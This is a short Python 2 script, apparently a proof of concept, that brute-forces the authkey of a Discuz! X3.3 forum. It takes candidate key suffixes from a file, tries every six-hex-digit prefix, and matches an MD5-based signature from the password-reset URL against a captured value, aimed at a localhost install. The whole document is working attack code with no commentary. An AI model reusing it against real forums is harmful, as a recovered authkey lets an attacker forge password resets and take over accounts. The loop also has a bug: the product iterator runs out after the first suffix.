# 进行验证
import itertools
import hashlib
import time
import sys

url = "http://127.0.0.1/dz3.3/"
idstring = "vnY6nW"
uid = 2
sign = "af3b937d0132a06b"
f_name = 'd.txt'

str_list = "0123456789abcdef"
def dsign(authkey):
    uurl = "{}member.php?mod=getpasswd&uid={}&id={}".format(url, uid, idstring)
    url_md5 = hashlib.md5(uurl + authkey)
    return url_md5.hexdigest()[:16]


def main():

    cnt = 0
    with open(f_name) as f:
        ranlist = [s[:-1] for s in f]
    s_list = sorted(set(ranlist), key=ranlist.index)
    r_list = itertools.product(str_list, repeat=6)
    print "[!] start running...."
    s_time = time.time()
    for s in s_list:
        for j in r_list:
            prefix = "".join(j)
            authkey = prefix + s
            # print authkey
            # time.sleep(1)
            sys.stdout.flush()
            if dsign(authkey) == sign:
                print "[*] found used time: " + str(time.time() - s_time)
                return "[*] authkey found: " + authkey
        cnt +=1
        print cnt

print main()
